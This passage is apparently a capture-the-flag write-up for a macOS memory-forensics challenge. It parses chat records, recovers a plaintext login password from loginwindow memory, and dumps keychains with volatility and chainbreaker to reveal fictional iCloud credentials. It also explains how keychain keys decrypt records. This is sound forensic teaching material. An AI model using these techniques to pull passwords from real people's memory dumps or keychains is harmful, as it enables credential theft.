</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;profileChange&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;removeAffiliate&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;viewMemberList&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>,
</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&#34;viewModeratorList&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>
</span></span><span style="display:flex;"><span>                                }
</span></span><span style="display:flex;"><span>                            },
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">&#34;loudNotification&#34;</span>: {
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">&#34;nameChange&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>
</span></span><span style="display:flex;"><span>                            },
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">&#34;autoJoin&#34;</span>: <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>                            <span style="color:#f92672">&#34;restricted&#34;</span>: <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>                        },
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;members&#34;</span>: [
</span></span><span style="display:flex;"><span>                            {
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">&#34;jid&#34;</span>: <span style="color:#e6db74">&#34;vx1x621ffzs2zyy6@go.to&#34;</span>,
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">&#34;oldAffiliation&#34;</span>: <span style="color:#e6db74">&#34;none&#34;</span>,
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">&#34;newAffiliation&#34;</span>: <span style="color:#e6db74">&#34;moderator&#34;</span>
</span></span><span style="display:flex;"><span>                            },
</span></span><span style="display:flex;"><span>                            {
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">&#34;jid&#34;</span>: <span style="color:#e6db74">&#34;k47pkcc74p5lb5lk@go.to&#34;</span>,
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">&#34;oldAffiliation&#34;</span>: <span style="color:#e6db74">&#34;none&#34;</span>,
</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">&#34;newAffiliation&#34;</span>: <span style="color:#e6db74">&#34;member&#34;</span>
</span></span><span style="display:flex;"><span>                            }
</span></span><span style="display:flex;"><span>                        ],
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;isDeleted&#34;</span>: <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;groupVersion&#34;</span>: <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;headers&#34;</span>: {},
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;GROUP_UPDATE_NOTIFICATION&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;908a73d6-e22c-4fa8-943e-2903a7ee3a69&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">&#34;to&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.t_
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">OE	o&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>,<span style="color:#f92672">&#34;actor&#34;</span>:<span style="color:#e6db74">&#34;vx1x621ffzs2zyy6@go.to&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;1748623639744&#34;</span>,<span style="color:#f92672">&#34;timestampInMillis&#34;</span>:<span style="color:#ae81ff">1748623639744</span>,<span style="color:#f92672">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;1748623639744-pZl-m202&#34;</span>,<span style="color:#f92672">&#34;actions&#34;</span>:[],<span style="color:#f92672">&#34;ignoreActions&#34;</span>:[],<span style="color:#f92672">&#34;x&#34;</span>:{<span style="color:#f92672">&#34;Grp_Version&#34;</span>:<span style="color:#ae81ff">1.0</span>}},{<span style="color:#f92672">&#34;members&#34;</span>:[{<span style="color:#f92672">&#34;jid&#34;</span>:<span style="color:#e6db74">&#34;9dm99teajkdad949@go.to&#34;</span>,<span style="color:#f92672">&#34;oldAffiliation&#34;</span>:<span style="color:#e6db74">&#34;none&#34;</span>,<span style="color:#f92672">&#34;newAffiliation&#34;</span>:<span style="color:#e6db74">&#34;member&#34;</span>}],<span style="color:#f92672">&#34;isDeleted&#34;</span>:<span style="color:#66d9ef">false</span>,<span style="color:#f92672">&#34;groupVersion&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;headers&#34;</span>:{},<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;GROUP_UPDATE_NOTIFICATION&#34;</span>,<span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;688fd6e5-407c-4f21-9c7d-a8add056fa67&#34;</span>,<span style="color:#f92672">&#34;to&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>,<span style="color:#f92672">&#34;actor&#34;</span>:<span style="color:#e6db74">&#34;vx1x621ffzs2zyy6@go.to&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;1748686230985&#34;</span>,<span style="color:#f92672">&#34;timestampInMillis&#34;</span>:<span style="color:#ae81ff">1748686230985</span>,<span style="color:#f92672">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;1748686230985-uGS-m203&#34;</span>,<span style="color:#f92672">&#34;actions&#34;</span>:[],<span style="color:#f92672">&#34;ignoreActions&#34;</span>:[],<span style="color:#f92672">&#34;x&#34;</span>:{<span style="color:#f92672">&#34;Grp_Version&#34;</span>:<span style="color:#ae81ff">2.0</span>}}]<span style="color:#960050;background-color:#1e0010">,</span><span style="color:#e6db74">&#34;chat&#34;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span><span style="color:#960050;background-color:#1e0010">},</span>{<span style="color:#f92672">&#34;messages&#34;</span>:[],<span style="color:#f92672">&#34;flockMessages&#34;</span>:[{<span style="color:#f92672">&#34;members&#34;</span>:[{<span style="color:#f92672">&#34;jid&#34;</span>:<span style="color:#e6db74">&#34;i6ibb9sf6s99rqsr@go.to&#34;</span>,<span style="color:#f92672">&#34;oldAffiliation&#34;</span>:<span style="color:#e6db74">&#34;none&#34;</span>,<span style="color:#f92672">&#34;newAffiliation&#34;</span>:<span style="color:#e6db74">&#34;member&#34;</span>}],<span style="color:#f92672">&#34;isDeleted&#34;</span>:<span style="color:#66d9ef">false</span>,<span style="color:#f92672">&#34;groupVersion&#34;</span>:<span style="color:#ae81ff">3</span>,<span style="color:#f92672">&#34;headers&#34;</span>:{},<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;GROUP_UPDATE_NOTIFICATION&#34;</span>,<span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;4362990f-0802-463f-9e40-fc24f583c41a&#34;</span>,<span style="color:#f92672">&#34;to&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>,<span style="color:#f92672">&#34;actor&#34;</span>:<span style="color:#e6db74">&#34;vx1x621ffzs2zyy6@go.to&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;1748687122077&#34;</span>,<span style="color:#f92672">&#34;timestampInMillis&#34;</span>:<span style="color:#ae81ff">1748687122077</span>,<span style="color:#f92672">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;1748687122077-nb7-m203&#34;</span>,<span style="color:#f92672">&#34;actions&#34;</span>:[],<span style="color:#f92672">&#34;ignoreActions&#34;</span>:[],<span style="color:#f92672">&#34;x&#34;</span>:{<span style="color:#f92672">&#34;Grp_Version&#34;</span>:<span style="color:#ae81ff">3.0</span>}},{<span style="color:#f92672">&#34;editedOn&#34;</span>:<span style="color:#e6db74">&#34;1748687219814&#34;</span>,<span style="color:#f92672">&#34;headers&#34;</span>:{},<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;GROUPCHAT&#34;</span>,<span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;a_1748687192012_91NfxZlDL5&#34;</span>,<span style="color:#f92672">&#34;to&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;vx1x621ffzs2zyy6@go.to&#34;</span>,<span style="color:#f92672">&#34;text&#34;</span>:<span style="color:#e6db74">&#34;Alright, team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ve you got?&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;1748687192712&#34;</span>,<span style="color:#f92672">&#34;timestampInMillis&#34;</span>:<span style="color:#ae81ff">1748687192712</span>,<span style="color:#f92672">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;1748687192712-nH4-m203&#34;</span>,<span style="color:#f92672">&#34;actions&#34;</span>:[],<span style="color:#f92672">&#34;ignoreActions&#34;</span>:[],<span style="color:#f92672">&#34;x&#34;</span>:{}}],<span style="color:#f92672">&#34;chat&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>}<span style="color:#960050;background-color:#1e0010">,</span>{<span style="color:#f92672">&#34;messages&#34;</span>:[],<span style="color:#f92672">&#34;flockMessages&#34;</span>:[{<span style="color:#f92672">&#34;messageUid&#34;</span>:<span style="color:#e6db74">&#34;1748687192712-nH4-m203&#34;</span>,<span style="color:#f92672">&#34;headers&#34;</span>:{},<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;EDIT_MESSAGE&#34;</span>,<span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;a_1748687219135_2MZ4wmKY1A&#34;</span>,<span style="color:#f92672">&#34;to&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;vx1x621ffzs2zyy6@go.to&#34;</span>,<span style="color:#f92672">&#34;text&#34;</span>:<span style="color:#e6db74">&#34;Alright, team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">hero or menace. Your call.&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;1748687259970&#34;</span>,<span style="color:#f92672">&#34;timestampInMillis&#34;</span>:<span style="color:#ae81ff">1748687259970</span>,<span style="color:#f92672">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;1748687259970-xA7-m202&#34;</span>,<span style="color:#f92672">&#34;actions&#34;</span>:[],<span style="color:#f92672">&#34;ignoreActions&#34;</span>:[],<span style="color:#f92672">&#34;x&#34;</span>:{}}],<span style="color:#f92672">&#34;chat&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>}<span style="color:#960050;background-color:#1e0010">,</span>{<span style="color:#f92672">&#34;messages&#34;</span>:[],<span style="color:#f92672">&#34;flockMessages&#34;</span>:[{<span style="color:#f92672">&#34;headers&#34;</span>:{},<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;GROUPCHAT&#34;</span>,<span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;a_1748687312623_gqDic4iOh2&#34;</span>,<span style="color:#f92672">&#34;to&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;vx1x621ffzs2zyy6@go.to&#34;</span>,<span style="color:#f92672">&#34;text&#34;</span>:<span style="color:#e6db74">&#34;Menace, obviously! Property damage? That
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ve been having laptop troubles.&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;1748687810040&#34;</span>,<span style="color:#f92672">&#34;timestampInMillis&#34;</span>:<span style="color:#ae81ff">1748687810040</span>,<span style="color:#f92672">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;1748687810040-Z2e-m201&#34;</span>,<span style="color:#f92672">&#34;actions&#34;</span>:[],<span style="color:#f92672">&#34;ignoreActions&#34;</span>:[],<span style="color:#f92672">&#34;x&#34;</span>:{}}],<span style="color:#f92672">&#34;chat&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>}<span style="color:#960050;background-color:#1e0010">,</span>{<span style="color:#f92672">&#34;messages&#34;</span>:[],<span style="color:#f92672">&#34;flockMessages&#34;</span>:[{<span style="color:#f92672">&#34;headers&#34;</span>:{},<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;GROUPCHAT&#34;</span>,<span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;d_1748688056131_3gq8425t&#34;</span>,<span style="color:#f92672">&#34;to&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;k47pkcc74p5lb5lk@go.to&#34;</span>,<span style="color:#f92672">&#34;text&#34;</span>:<span style="color:#e6db74">&#34;Hey,yeah , about that.. my laptop\u0027s been a nightmare lately. it keeps freezing, and i can\u0027t even open my editing software half the time. I\u0027ve got some great Spider-Man shots from last week, but i cant\u0027t get to them until i fix this. Does anyone know a good tech guy? I\u0027m desperate here.&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;1748688056374&#34;</span>,<span style="color:#f92672">&#34;timestampInMillis&#34;</span>:<span style="color:#ae81ff">1748688056374</span>,<span style="color:#f92672">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;1748688056374-RS9-m202&#34;</span>,<span style="color:#f92672">&#34;actions&#34;</span>:[],<span style="color:#f92672">&#34;ignoreActions&#34;</span>:[],<span style="color:#f92672">&#34;x&#34;</span>:{}},{<span style="color:#f92672">&#34;headers&#34;</span>:{},<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;GROUPCHAT&#34;</span>,<span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;d_1748688722636_rxcqptjm&#34;</span>,<span style="color:#f92672">&#34;to&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;9dm99teajkdad949@go.to&#34;</span>,<span style="color:#f92672">&#34;text&#34;</span>:<span style="color:#e6db74">&#34;Peter, I know a reliable IT service in Midtown
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">d like. You really need to get those photos to Jonah soon.&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#e6db74">&#34;1748688722821&#34;</span>,<span style="color:#f92672">&#34;timestampInMillis&#34;</span>:<span style="color:#ae81ff">1748688722821</span>,<span style="color:#f92672">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;1748688722821-cth-m202&#34;</span>,<span style="color:#f92672">&#34;actions&#34;</span>:[],<span style="color:#f92672">&#34;ignoreActions&#34;</span>:[],<span style="color:#f92672">&#34;x&#34;</span>:{}}],<span style="color:#f92672">&#34;chat&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>}<span style="color:#960050;background-color:#1e0010">,</span>{<span style="color:#f92672">&#34;messages&#34;</span>:[],<span style="color:#f92672">&#34;receipts&#34;</span>:[{<span style="color:#f92672">&#34;jid&#34;</span>:<span style="color:#e6db74">&#34;k47pkcc74p5lb5lk@go.to&#34;</span>,<span style="color:#f92672">&#34;lr&#34;</span>:<span style="color:#ae81ff">1748688980321</span>}],<span style="color:#f92672">&#34;flockMessages&#34;</span>:[{<span style="color:#f92672">&#34;headers&#34;</span>:{},<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;GROUPCHAT&#34;</span>,<span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;d_1748688939932_vprh7kxk&#34;</span>,<span style="color:#f92672">&#34;to&#34;</span>:<span style="color:#e6db74">&#34;867b48b3f94649008358037031d96778@groups.go.to&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;k47pkcc74p5lb5lk@go.to&#34;</span>,<span style="color:#f92672">&#34;text&#34;</span>:<span style="color:#960050;background-color:#1e0010">&#34;Thanks</span>, <span style="color:#960050;background-color:#1e0010">Robbie,</span> <span style="color:#960050;background-color:#1e0010">that</span> <span style="color:#960050;background-color:#1e0010">sounds</span> <span style="color:#960050;background-color:#1e0010">perfect.I\u0027ll</span> <span style="color:#960050;background-color:#1e0010">reach</span> <span style="color:#960050;background-color:#1e0010">out</span> <span style="color:#960050;background-color:#1e0010">to</span> <span style="color:#960050;background-color:#1e0010">TechFix</span> <span style="color:#960050;background-color:#1e0010">Solutions</span> <span style="color:#960050;background-color:#1e0010">right</span> <span style="color:#960050;background-color:#1e0010">away.</span> <span style="color:#960050;background-color:#1e0010">I</span> <span style="color:#960050;background-color:#1e0010">don\u0027t</span> <span style="color:#960050;background-color:#1e0010">want</span> <span style="color:#960050;background-color:#1e0010">to</span> <span style="color:#960050;background-color:#1e0010">mess</span> <span style="color:#960050;background-color:#1e0010">around</span> <span style="color:#960050;background-color:#1e0010">with</span> <span style="color:#960050;background-color:#1e0010">random</span> <span style="color:#960050;background-color:#1e0010">fixes</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">_1074.messages=_1074.messages.concat(_1075.flockMessages);</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">_108c[_1096</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">]=_108c[_1096</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">].concat(_1095.flockMessages);</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">_1094+=_1095.flockMessages.length;</span>
</span></span></code></pre></div><p>and by parsing the IndexedDb using the <a href="https://github.com/google/dfindexeddb" target="_blank"><code>dfindexeddb</code></a>  we get :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;jid&#34;</span>: <span style="color:#e6db74">&#34;9dm99teajkdad949@go.to&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;pinned&#34;</span>: <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;buddy&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1748682665271.0</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;ownerGuid&#34;</span>: <span style="color:#e6db74">&#34;k47pkcc74p5lb5lk&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Robbie Robertson&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;chatName&#34;</span>: <span style="color:#e6db74">&#34;Robbie R&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;jefoyil452@baxima.com&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;mobile&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;__type__&#34;</span>: <span style="color:#e6db74">&#34;Undefined&#34;</span>
</span></span><span style="display:flex;"><span>          }
</span></span></code></pre></div><p>also we can notice pattern that from <code>&lt;flockml&gt;</code> :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;flockml&gt;</span>Hello Peter! Jefoyil452 just joined Flock.<span style="color:#f92672">&lt;br/&gt;</span>Why don&#39;t you <span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#39;hi&#39;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#39;sendEvent&#39;</span><span style="color:#f92672">&gt;</span>say Hi<span style="color:#f92672">&lt;/action&gt;</span> and welcome Jefoyil452 to your team?<span style="color:#f92672">&lt;/flockml&gt;</span>
</span></span></code></pre></div><p>therefore, the answer to the above question is :</p>
<pre tabindex="0"><code>Robbie-Robertson_jefoyil452@baxima.com_TechFix_Spiderman:_Menace
</code></pre><p>Q7/15) What are the login credentials of the compromised system? Format: <em>username:password</em></p>
<p>For getting the credentials of the compromised system, i don&rsquo;t know why  but Many initially tried brute-forcing a hash to find the credentials, but a hint clarified this approach is incorrect. Instead, the solution exploits a  security flaw in Mac OS X&rsquo;s <code>LoginWindow.app</code>, where user credentials (usernames and passwords) are not properly cleared from memory after authentication<a href="https://seclists.org/bugtraq/2008/Feb/442" target="_blank">(refrence)</a>. This allows potential extraction of plaintext passwords from memory dumps, particularly in systems running older versions of  Mac OS X.  <code>Loginwindow</code> doesn&rsquo;t sanitize the user supplied password after the login is authenticated. This appears to last for the entirety of the session. The application <code>loginwindow</code> running as:</p>
<pre tabindex="0"><code>/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow
console
</code></pre><p>This allows plaintext passwords to be extracted from a memory dump—a snapshot of the system&rsquo;s RAM so from this  <a href="https://faculty.nps.edu/ncrowe/oldstudents/icdf2c17_leopard.htm" target="_blank">blog</a>, we can see that simply by searching  for the term <code>longname</code>  in the memory dump we can see that there only  10 occurences of it and upon scrolling on 9th occurence we can find the password :
<img src="images/7.png" alt="password in hex">
therefore the answer is :</p>
<pre tabindex="0"><code>admin:!_L0v3_U%3000
</code></pre><p>Q8/15) What is the email and password for Peter Parker’s iCloud account? Format: <em>email:password</em>
For getting the email and password for Peter Parker&rsquo;s iCloud account ,generally all the usernames and passwords for macOS  are managed by the default password manager <code>KeyChain Access</code>, there are two files which contain these <code>login.keychain</code> whose path is :</p>
<pre tabindex="0"><code>0xffffff802d714960 /Users/admin/Library/Keychains/login.keychain
</code></pre><p>and <code>system.keychain</code> whose path is :</p>
<pre tabindex="0"><code>0xffffff802243fe10 /Library/Keychains/System.keychain
</code></pre><p>upon dumping both of them using <code>mac_dump_file</code> from volatility 2 :</p>
<pre tabindex="0"><code>login.keychain:  Mac OS X Keychain File
system.keychain: Mac OS X Keychain File
</code></pre><p>if you are using a macOS system you  can directly try to unlock the <code>login.keychain</code> file by opening them with <code>Keychain Access</code> and then use the login password to unlock it:
<img src="images/8.png" alt="login.keychain unlocked on macOS">
we can also unlock the <code>.keychain</code> file even if we are not on a macOS system, there is a tool written by <a href="https://x.com/n0fate" target="_blank">n0fate</a> on github called <a href="https://github.com/n0fate/chainbreaker" target="_blank">chainbreaker</a> which helps us to unlock <code>.keychain</code> files if we either have the password or master key , well in this case we already have the password <code>!_L0v3_U%3000</code> with us , so we don&rsquo;t need the master key to unlock it , by using <code>chainbreaker</code> on the <code>login.keychain</code> we get the iCloud account password as a generic password record:</p>
<pre tabindex="0"><code>$ chainbreaker --dump-all login.keychain --password  &#39;!_L0v3_U%3000&#39; | grep iCloud
2025-07-29 16:02:35,997 - INFO -         [-] Print Name: b&#39;iCloud - peter.parker@icloud.com&#39;
2025-07-29 16:02:35,997 - INFO -         [-] Service: b&#39;iCloud - peter.parker@icloud.com&#39;
2025-07-29 16:02:35,997 - INFO -         [-] Password: Spidey_iCloud_123
</code></pre><p>therefore the answer is :</p>
<pre tabindex="0"><code>peter.parker@icloud.com:Spidey_iCloud_123
</code></pre><p>Q9/15) What are the master key, database key, record key, and SSGP label for the keychain record containing Peter Parker’s Gmail account credentials? Format: <em>masterkey_dbkey_recordkey_SSGP-label</em>
For this question in order to get  the master key, database key, record key and SSGP label for the keychain record with Peter Parker&rsquo;s Gmail account credentials ,we need to dig into the  structure of  macOS <code>.keychain</code> file , and also i found this super  <a href="https://repo.zenk-security.com/Forensic/Keychain%20Analysis%20with%20Mac%20OS%20X%20Memory%20Forensics.pdf" target="_blank">interesting paper</a> on  <code>Keychain Analysis with Mac OS X Memory Forensics</code>  that breaks it down perfectly, here is an illustration from the paper depicting the Keychain Structure :
<img src="images/9.png" alt="Keychain Structure">
Also in order to get familiar with all the terms and phrases here is a brief of what each term is and its usage described below:</p>
<ul>
<li>The <code>.keychain</code> file uses the Apple Database format, with a header, schema, and tables (Figure 4 in the paper). The keychain stores encrypted credentials in tables like <code>CSSM_DL_DB_INTERNET_PASSWORD</code> for Gmail accounts
<img src="images/14.png" alt="Apple DB Header and Schema"></li>
<li><strong>Master Key</strong>: This is a 24-byte key used to unlock the keychain’s secrets. In macOS Lion (10.7) and later, it hangs out in the <code>securityd</code> process’s <code>MALLOC_TINY</code> memory region (1MB chunk). It’s either derived from the user’s login password (like <code>!_L0v3_U%3000</code> from Q7) or grabbed directly from a memory dump using tools like volatility’s <code>mac_keychaindump</code> in our case(the paper mentions that we can use <code>volafox</code>&rsquo;s  <code>keychaindump</code> plugin too which is also one of the tool written by <a href="https://x.com/n0fate" target="_blank">n0fate</a> for macOS memory analysis). The paper explains it’s 0x18 bytes long and validated by checking the keychain file’s signature.</li>
<li><strong>Database Key</strong>: A 24-byte key stored in the <code>DbBlob</code> record of the <code>CSSM_DL_DB_RECORD_METADATA</code> table in the <code>.keychain</code> file. It’s encrypted with the master key using Triple DES (3DES) in CBC mode with PKCS#1 padding. Once decrypted, it’s the key to unlocking record keys. The paper’s Figure 7 shows the <code>DbBlob</code> structure with a salt, IV, and encrypted database key:
<img src="images/10.png" alt="DbBlob Structure"></li>
<li><strong>Record Key</strong>: Another 24-byte key, found in the <code>KeyBlob</code> record of the <code>CSSM_DL_DB_SYMMETRIC_KEY</code> table(ref. Figure 8 in the paper). It’s encrypted with the database key (3DES, CBC, PKCS#1) and needs two decryptions: first with a fixed IV (<code>magicCmsIv</code>: <code>4adda22c79e82105</code>), then with the <code>KeyBlob</code>’s own IV, reversing the first output’s octets (see Figure 10 in the paper).
<img src="images/11.png" alt="Record Header in SYMMETRIC_KEY table"></li>
</ul>
<p><img src="images/13.png" alt="KeyBlob Decryption Process">
This key decrypts specific credentials, like for instance Peter Parker’s Gmail password in our case.</p>
<ul>
<li><strong>SSGP Label</strong>: A 16-byte identifier tagged with the signature <code>ssgp</code> in both <code>KeyBlob</code> and <code>DataBlob</code> records. It links a record key to the right user credential in the <code>CSSM_DL_DB_INTERNET_PASSWORD</code> table (since Gmail is an internet account). The paper’s Figure 9 shows the <code>KeyBlob</code> structure with the SSGP label right after the signature.
<img src="images/12.png" alt="KeyBlob Structure">
summing everything up from the above , we can use the <code>chainbreaker</code> tool itself to get all the above mentioned items since we already have the login password <code>!_L0v3_U%3000</code>, and also  an understanding of how keychain files work in storing and decrypting the password, we just need to tweak the <code>chainbreaker.py</code> script under <code>chainbreaker</code> a bit such that it prints all the keys and the SSGP label . here is the tweaked version of the script:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Author : n0fate</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># E-Mail rapfer@gmail.com, n0fate@n0fate.com</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 10/7/2020 - Significant changes made by luke@socially-inept.net</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This program is free software; you can redistribute it and/or modify</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># it under the terms of the GNU General Public License as published by</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the Free Software Foundation; either version 2 of the License, or (at</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># your option) any later version.</span>
